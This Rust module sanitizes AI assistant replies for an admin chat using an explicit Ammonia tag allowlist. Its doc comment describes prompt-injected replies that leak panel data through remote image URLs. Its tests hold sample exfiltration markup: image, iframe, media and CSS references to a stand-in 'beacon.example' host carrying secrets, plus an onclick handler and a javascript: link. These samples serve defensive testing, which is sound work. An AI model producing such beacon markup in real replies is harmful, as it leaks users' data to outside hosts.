//! Sanitizer for assistant replies rendered in the admin chat.

/// Elements a reply may use: text structure and formatting only.
///
/// Ammonia's default allowlist also permits `<img src>`, so a prompt-injected
/// reply could render a remote image whose URL carries data out of the panel
/// wherever the host's CSP does not restrict `img-src` (development or custom
/// stacks). None of these elements loads a resource by itself, and the list
/// is explicit so a future Ammonia default cannot add one.
const CHAT_TAGS: &[&str] = &[
    "a",
    "abbr",
    "b",
    "blockquote",
    "br",
    "caption",
    "code",
    "dd",
    "del",
    "div",
    "dl",
    "dt",
    "em",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "hr",
    "i",
    "ins",
    "kbd",
    "li",
    "mark",
    "ol",
    "p",
    "pre",
    "q",
    "s",
    "samp",
    "small",
    "span",
    "strong",
    "sub",
    "sup",
    "table",
    "tbody",
    "td",
    "th",
    "thead",
    "tr",
    "u",
    "ul",
    "var",
];

/// Cleans provider or fallback output for the chat bubble. Scripts, event
/// handlers, dangerous URL schemes and every element outside [`CHAT_TAGS`]
/// are removed; a kept link needs a click and carries
/// `rel="noopener noreferrer"`.
pub(super) fn sanitize_chat_html(html: &str) -> String {
    ammonia::Builder::default()
        .tags(CHAT_TAGS.iter().copied().collect())
        .link_rel(Some("noopener noreferrer"))
        .clean(html)
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn replies_cannot_load_remote_resources() {
        let reply = "<p>Totals</p>\
            <img src=\"https://beacon.example/i?d=secret\">\
            <picture><source srcset=\"https://beacon.example/p\"></picture>\
            <video src=\"https://beacon.example/v\" poster=\"https://beacon.example/o\"></video>\
            <audio src=\"https://beacon.example/a\"></audio>\
            <iframe src=\"https://beacon.example/f\"></iframe>\
            <object data=\"https://beacon.example/b\"></object>\
            <embed src=\"https://beacon.example/e\">\
            <input type=\"image\" src=\"https://beacon.example/n\">\
            <link rel=\"stylesheet\" href=\"https://beacon.example/s.css\">\
            <svg><image href=\"https://beacon.example/g\"></image></svg>\
            <map><area href=\"https://beacon.example/m\"></map>\
            <table background=\"https://beacon.example/t\"><tr><td style=\"background:url(https://beacon.example/c)\">1</td></tr></table>\
            <a href=\"https://docs.example/guide\" onclick=\"steal()\">guide</a>\
            <a href=\"javascript:alert(1)\">bad</a>";
        let html = sanitize_chat_html(reply);
        assert!(!html.contains("beacon.example"), "{html}");
        assert!(!html.contains("javascript:"), "{html}");
        assert!(!html.contains("onclick"), "{html}");
        assert!(html.contains("<p>Totals</p>"), "{html}");
        assert!(html.contains("<td>1</td>"), "{html}");
        assert!(
            html.contains(
                "<a href=\"https://docs.example/guide\" rel=\"noopener noreferrer\">guide</a>"
            ),
            "{html}"
        );
    }

    #[test]
    fn the_formatting_the_prompt_asks_for_is_kept() {
        let reply = "<p>Use <code>SELECT 1</code>:</p><pre>SELECT 1;</pre>\
                     <ul><li><strong>a</strong></li></ul>";
        assert_eq!(sanitize_chat_html(reply), reply);
    }
}
